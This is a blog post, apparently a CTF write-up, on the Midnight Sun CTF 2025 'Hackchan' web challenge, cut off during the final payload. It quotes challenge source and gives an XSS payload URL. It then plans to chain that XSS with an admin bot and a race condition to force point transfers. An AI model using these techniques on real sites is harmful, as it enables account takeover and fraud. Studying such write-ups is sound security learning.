

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>Midnight Sun CTF 2025 WEB - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="Midnight Sun CTF 2025 WEB" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://ML-hacker.github.io/posts/midnight-sun-ctf-2025-web/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-05-22T00:36:52+08:00" />
<meta property="article:modified_time" content="2025-05-22T00:36:52+08:00" />

<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Midnight Sun CTF 2025 WEB"/>
<meta name="twitter:description" content=""/>
<meta name="application-name" content="Delete&#39;s blog">
<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">

<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/midnight-sun-ctf-2025-web/" /><link rel="prev" href="http://ML-hacker.github.io/posts/classloader-learning/" />
<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Midnight Sun CTF 2025 WEB",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http://ML-hacker.github.io/posts/midnight-sun-ctf-2025-web/"
        },"genre": "posts","keywords": "xss, sendmail, race conditon","wordcount":  1163 ,
        "url": "http://ML-hacker.github.io/posts/midnight-sun-ctf-2025-web/","datePublished": "2025-05-22T00:36:52+08:00","dateModified": "2025-05-22T00:36:52+08:00","publisher": {
            "@type": "Organization",
            "name": "Delete"},"author": {
                "@type": "Person",
                "name": "Delete"
            },"description": ""
    }
    </script></head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
        window.switchThemeEventSet = new Set()
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
                        <option value="light">Light</option>
                        <option value="dark">Dark</option>
                        <option value="black">Black</option>
                        <option value="auto">Auto</option>
                    </select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                    <option value="light">Light</option>
                    <option value="dark">Dark</option>
                    <option value="black">Black</option>
                    <option value="auto">Auto</option>
                </select>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Midnight Sun CTF 2025 WEB</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2025-05-22">2025-05-22</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2025-05-22">2025-05-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1163 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;<span id="/posts/midnight-sun-ctf-2025-web/" class="leancloud_visitors" data-flag-title="Midnight Sun CTF 2025 WEB">
                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class="leancloud-visitors-count waline-pageview-count" data-path="/posts/midnight-sun-ctf-2025-web/"></span>&nbsp;views
                    </span>&nbsp;<span id="/posts/midnight-sun-ctf-2025-web/" class="comment_count" data-flag-title="Midnight Sun CTF 2025 WEB">
                        <i class="far fa-comments fa-fw"></i>&nbsp;<span class="waline-comment-count" id="waline-comment-count" data-path="/posts/midnight-sun-ctf-2025-web/"></span>&nbsp;comments
                    </span>&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#hackchan"><strong>Hackchan</strong></a>
      <ul>
        <li><a href="#condition-of-getting-flag">Condition of getting flag</a></li>
        <li><a href="#bot处理流程">bot处理流程</a></li>
      </ul>
    </li>
    <li><a href="#uselesscorp"><strong>Uselesscorp</strong></a></li>
    <li><a href="#写在最后">写在最后</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="hackchan" class="headerLink">
    <a href="#hackchan" class="header-mark"></a><strong>Hackchan</strong></h2><pre><code>Hackchan is your friendly neighborhood grocery store, with an exclusive loyalty program where points can be redeemed for amazing rewards. The system is said to be bulletproof, but there are whispers of a vulnerability that would allow one into the Billionaire Club by obtaining one billion loyalty points in their Hackchan account.
</code></pre>
<h3 id="condition-of-getting-flag" class="headerLink">
    <a href="#condition-of-getting-flag" class="header-mark"></a>Condition of getting flag</h3><p>在views.py中看见了得到flag的条件</p>
<p>Saw the condition for getting the flag in <code>views.py</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">            <span class="k">case</span> <span class="s1">&#39;delete-account-and-get-flag&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">current_user</span><span class="o">.</span><span class="n">balance</span> <span class="o">&gt;=</span> <span class="mi">999_999_999</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">current_user</span><span class="o">.</span><span class="n">is_manager</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">current_user</span><span class="o">.</span><span class="n">is_admin</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">current_user</span><span class="o">.</span><span class="n">remove</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                    <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                    <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;midnight{********REDACTED********}&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="n">_</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">current_user</span><span class="o">.</span><span class="n">balance</span> <span class="o">&gt;=</span> <span class="mi">999_999_999</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">current_user</span><span class="o">.</span><span class="n">is_manager</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">current_user</span><span class="o">.</span><span class="n">is_admin</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">context</span><span class="p">[</span><span class="s1">&#39;show_flag_button&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                <span class="n">template</span> <span class="o">=</span> <span class="s2">&#34;authenticated_template.html&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>即当当前用户的balance大于999_999_999的时候就可以得到flag，所以要看一下逻辑。</p>
<p>That is, when the current user&rsquo;s balance is greater than 999_999_999, the flag can be obtained. So we need to examine the logic.</p>
<h3 id="bot处理流程" class="headerLink">
    <a href="#bot%e5%a4%84%e7%90%86%e6%b5%81%e7%a8%8b" class="header-mark"></a>bot处理流程</h3><p>在bot.js中处理problem中的url的过程，这个地方就可以构造路由让admin去访问。</p>
<p>In bot.js, the URL in problem is handled — this is where we can construct a route to make the admin visit it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="n">const</span> <span class="n">word</span> <span class="n">of</span> <span class="n">problemWords</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">const</span> <span class="n">urlPattern</span> <span class="o">=</span> <span class="o">/^</span><span class="n">http</span><span class="p">:</span>\<span class="o">/</span>\<span class="o">/</span><span class="n">web</span><span class="p">:</span><span class="mi">8000</span>\<span class="o">//</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">urlPattern</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="n">word</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">word</span> <span class="o">!==</span> <span class="n">homeOrigin</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">const</span> <span class="n">currentProblem</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">url</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">          <span class="k">await</span> <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="n">word</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">await</span> <span class="n">page</span><span class="o">.</span><span class="n">waitForTimeout</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">await</span> <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="n">currentProblem</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后和balance有关的函数只有</p>
<p>Then, the only function related to balance is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_transaction</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">app_context</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">confirmed_transactions</span> <span class="o">=</span> <span class="n">Transaction</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="n">Transaction</span><span class="o">.</span><span class="n">status</span> <span class="o">==</span> <span class="s1">&#39;confirmed&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">transaction</span> <span class="ow">in</span> <span class="n">confirmed_transactions</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">sender</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">transaction</span><span class="o">.</span><span class="n">sender_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">recipient</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">transaction</span><span class="o">.</span><span class="n">recipient_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">sender</span> <span class="ow">and</span> <span class="n">recipient</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">sender</span><span class="o">.</span><span class="n">balance</span> <span class="o">&gt;=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">amount</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">transaction</span><span class="o">.</span><span class="n">status</span> <span class="o">=</span> <span class="s1">&#39;sent&#39;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="ow">not</span> <span class="n">sender</span><span class="o">.</span><span class="n">is_manager</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">sender</span><span class="o">.</span><span class="n">balance</span> <span class="o">-=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">amount</span>
</span></span><span class="line"><span class="cl">                    <span class="n">recipient</span><span class="o">.</span><span class="n">balance</span> <span class="o">+=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">amount</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">transaction</span><span class="o">.</span><span class="n">status</span> <span class="o">=</span> <span class="s1">&#39;rejected&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后我们现在要找到一个地方去得到balance，于是翻看源码
这里用了TF-IDF，将question转换为了数值向量</p>
<p>Now we need to find a place to gain balance, so let&rsquo;s go through the source code.
Here, TF-IDF is used to convert the question into a numeric vector.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">tfidf_vectorizer</span> <span class="o">=</span> <span class="n">TfidfVectorizer</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">faq_questions</span> <span class="o">=</span> <span class="p">[</span><span class="n">item</span><span class="p">[</span><span class="s1">&#39;question&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">faq_data</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">tfidf_matrix</span> <span class="o">=</span> <span class="n">tfidf_vectorizer</span><span class="o">.</span><span class="n">fit_transform</span><span class="p">(</span><span class="n">faq_questions</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后我们主要看到处理fac这里。</p>
<p>Now focus on how faq is handled.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">            <span class="k">case</span> <span class="s1">&#39;faq&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">question</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;question&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">question</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">user_question_tfidf</span> <span class="o">=</span> <span class="n">tfidf_vectorizer</span><span class="o">.</span><span class="n">transform</span><span class="p">([</span><span class="n">question</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">                    <span class="n">cosine_similarities</span> <span class="o">=</span> <span class="n">linear_kernel</span><span class="p">(</span><span class="n">user_question_tfidf</span><span class="p">,</span> <span class="n">tfidf_matrix</span><span class="p">)</span><span class="o">.</span><span class="n">flatten</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                    <span class="n">most_similar_index</span> <span class="o">=</span> <span class="n">cosine_similarities</span><span class="o">.</span><span class="n">argsort</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                    <span class="n">label</span> <span class="o">=</span> <span class="n">faq_data</span><span class="p">[</span><span class="n">most_similar_index</span><span class="p">][</span><span class="s1">&#39;label&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                    <span class="n">listdir</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s1">&#39;templates/faq/answers&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">listdir</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">label</span> <span class="ow">in</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;/faq/answers/&#39;</span> <span class="o">+</span> <span class="n">file</span>
</span></span><span class="line"><span class="cl">                            <span class="n">context</span><span class="p">[</span><span class="s1">&#39;question&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">question</span>
</span></span><span class="line"><span class="cl">                            <span class="k">break</span>
</span></span><span class="line"><span class="cl">                    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Answer not found, please contact us&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;faq/faq.html&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;faq/faq.html&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>所以我们只需要找一个label匹配到我们的.swp文件（题目故意留的，可以嵌入xss，but我利用vim -r 看不出来是什么问题，所以等wp吧，再补上）</p>
<p>So we only need to find a label that matches our .swp file (intentionally left by the challenge, can be used to inject XSS — but I couldn’t see the problem clearly using vim -r, so I’ll wait for the writeup to patch this part).
<figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/1.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/1.png, /img/Midnight-Sun-CTF-2025-WEB/1.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/1.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/1.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/1.png" ></figure>
因为是<code>.</code>开头的文件，所以在文件系统里面会放在最前面，再回顾我们的fac内容，这里只贴出部分</p>
<p>Since it’s a file starting with <code>.</code>, it will be listed at the top of the filesystem. Looking back at our faq content (partial screenshot):
<figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/2.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/2.png, /img/Midnight-Sun-CTF-2025-WEB/2.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/2.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/2.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/2.png" ></figure>
我们只需要匹配其中的media即可，他就会将.swap文件渲染出来。
所以我们只需要让<code>action=fac&amp;question={text}</code>的text内容与对应的question对应上即可</p>
<p>We just need to match media in it, and it will render the .swp file.
So we only need to let <code>action=faq&amp;question={text}</code> — where the text matches a question — and it will work:
<figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/3.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/3.png, /img/Midnight-Sun-CTF-2025-WEB/3.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/3.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/3.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/3.png" ></figure>
playload:
<code>https://hackchan-mjk2mpay.ctf.pro/?action=faq&amp;question=How can I get in touch with your PR department for collaboration?&lt;script&gt;alert('hacked by dt')&lt;/script&gt;</code>
<figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/4.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/4.png, /img/Midnight-Sun-CTF-2025-WEB/4.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/4.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/4.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/4.png" ></figure>
即可触发xss，那么接下来就很简单了，记得我们前面的bot吗，只需要控制这个xss让bot给我们转钱即可。
所以让bot访问：</p>
<p>That will trigger XSS. Next is straightforward. Remember the bot from earlier? We just need to control the XSS to make the bot transfer money to us.
So let the bot visit:
<code>http://web:8000/?action=create-transaction9</code>然后post过去
<code>recipient=deletee&amp;amount=9999999999</code>
<figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/5.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/5.png, /img/Midnight-Sun-CTF-2025-WEB/5.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/5.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/5.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/5.png" ></figure>
但是一次最多只能转10块钱，所以还得看一下逻辑，然后注意到处理的时候是分两块的</p>
<p>But only 10 units can be transferred at a time. Let&rsquo;s review the logic. Note that processing is split into two phases:</p>
<p><figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/6.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/6.png, /img/Midnight-Sun-CTF-2025-WEB/6.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/6.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/6.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/6.png" ></figure>
看到这里<code>confirmed_transactions = Transaction.query.filter(Transaction.status == 'confirmed').all()</code>所以我们可以在<code>confirm_transaction</code>之后的间隙将订单的status更改一次为confirmed即可完成转账，也就是race condition
最后的playload：</p>
<p>See here: <code>confirmed_transactions = Transaction.query.filter(Transaction.status == 'confirmed').all() </code>— so we can change the status of a transaction to confirmed in the gap after confirming, to complete the transfer. That’s a race condition.
Final payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://web:8000/?action=create-transaction&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;headers&#39;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;content-type&#34;</span><span class="o">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
